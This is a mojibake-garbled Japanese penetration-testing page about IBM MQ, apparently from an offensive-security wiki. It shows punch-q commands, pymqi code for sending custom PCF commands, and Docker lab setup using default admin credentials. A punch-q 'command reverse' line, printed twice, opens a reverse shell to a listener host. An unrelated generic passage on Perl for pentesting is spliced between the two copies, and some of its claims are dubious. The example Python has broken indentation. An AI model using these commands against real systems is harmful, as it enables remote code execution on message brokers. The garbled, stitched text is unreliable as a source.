â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
Perlï¼ˆãƒ‘ãƒ¼ãƒ«ï¼‰ã«ã¤ã„ã¦ï¼š

Perlã¯ã€é«˜æ°´æº–ã®å‹•çš„ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã§ã‚ã‚Šã€å¤šãã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚Perlã¯ã€ãã®æŸ”è»Ÿæ€§ã¨å¼·åŠ›ãªãƒ†ã‚­ã‚¹ãƒˆå‡¦ç†æ©Ÿèƒ½ã§çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ä»¥ä¸‹ã¯ã€Perlã‚’ä½¿ç”¨ã—ãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã«é–¢ã™ã‚‹ã„ãã¤ã‹ã®é‡è¦ãªãƒã‚¤ãƒ³ãƒˆã§ã™ã€‚

1. ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ï¼šPerlã®Net::Pingãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ç‰¹å®šã®ãƒãƒ¼ãƒˆã®çŠ¶æ…‹ã‚’ç¢ºèªã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€é–‹ã„ã¦ã„ã‚‹ãƒãƒ¼ãƒˆã‚„é–‰ã˜ã¦ã„ã‚‹ãƒãƒ¼ãƒˆã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

2. ãƒ‘ã‚±ãƒƒãƒˆã‚­ãƒ£ãƒ—ãƒãƒ£ï¼šPerlã®Net::Pcapãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ‘ã‚±ãƒƒãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã€è§£æã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®åˆ†æã‚„æ½œåœ¨çš„ãªè„†å¼±æ€§ã®ç‰¹å®šãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

3. ãƒ—ãƒ­ãƒˆã‚³ãƒ«è§£æï¼šPerlã®Net::Packetãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ã•ã¾ã–ã¾ãªãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’è§£æã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®é€šä¿¡ã®å†…å®¹ã‚„æ§‹é€ ã‚’ç†è§£ã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®å•é¡Œã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

4. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¢ã‚¯ã‚»ã‚¹ï¼šPerlã®DBIãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã—ã¦ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ãŸã‚Šã€ãƒ‡ãƒ¼ã‚¿ã‚’æ“ä½œã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«é–¢é€£ã™ã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®å•é¡Œã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

5. ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆï¼šPerlã®LWPãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ†ã‚¹ãƒˆã‚’è‡ªå‹•åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è„†å¼±æ€§ã‚’ç‰¹å®šã—ã€æ‚ªç”¨ã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚

Perlã¯ã€ãã®è±Šå¯Œãªãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¨æŸ”è»Ÿæ€§ã«ã‚ˆã‚Šã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã«ãŠã„ã¦éå¸¸ã«æœ‰ç”¨ãªãƒ„ãƒ¼ãƒ«ã¨ãªã£ã¦ã„ã¾ã™ã€‚
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### ã‚«ã‚¹ã‚¿ãƒ PCF

IBM MQã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’èª¿ã¹ã€**punch-q**ã§å®Ÿè£…ã•ã‚Œã¦ã„ãªã„ç‰¹å®šã®PCFã‚³ãƒãƒ³ãƒ‰ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã€**pymqi**ã®Pythonãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç›´æ¥ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**ä¾‹:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
ã‚‚ã—å®šæ•°ã®åå‰ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€[IBM MQã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors)ã‚’å‚ç…§ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

> *ä¾‹ã¨ã—ã¦ã€[`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (10é€²æ•° = 73)ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿`MQCA_CLUSTER_NAME` (10é€²æ•° = 2029)ãŒå¿…è¦ã§ã€`*`ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ: ï¼‰ã€‚*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("ã‚¨ãƒ©ãƒ¼")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## ãƒ†ã‚¹ãƒˆç’°å¢ƒ

IBM MQã®å‹•ä½œã‚„è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã€Dockerã‚’ä½¿ç”¨ã—ãŸãƒ­ãƒ¼ã‚«ãƒ«ç’°å¢ƒã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

1. ibm.comã¨cloud.ibm.comã«ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹ã“ã¨ã€‚
2. ä»¥ä¸‹ã®æ‰‹é †ã§ã‚³ãƒ³ãƒ†ãƒŠåŒ–ã•ã‚ŒãŸIBM MQã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€èªè¨¼ã¯æœ‰åŠ¹ã«ãªã£ã¦ãŠã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¯ `admin` ã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯ `passw0rd` ã§ã™ï¼ˆç’°å¢ƒå¤‰æ•° `MQ_ADMIN_PASSWORD`ï¼‰ã€‚
ã“ã“ã§ã¯ã€ã‚­ãƒ¥ãƒ¼ãƒãƒãƒ¼ã‚¸ãƒ£ã®åå‰ãŒ `MYQUEUEMGR` ã«è¨­å®šã•ã‚Œã¦ã„ã¾ã™ï¼ˆå¤‰æ•° `MQ_QMGR_NAME`ï¼‰ã€‚

IBM MQã‚’èµ·å‹•ã—ã€ãƒãƒ¼ãƒˆã‚’å…¬é–‹ã—ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQã®å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã¯æ¬¡ã®å ´æ‰€ã«ã‚ã‚Šã¾ã™ï¼šhttps://hub.docker.com/r/ibmcom/mq/ã€‚

## å‚è€ƒæ–‡çŒ®

* [mgeekyã®gist - "å®Ÿè·µçš„ãªIBM MQãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã®ãƒãƒ¼ãƒˆ"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://www.ibm.com/docs/en/ibm-mq)
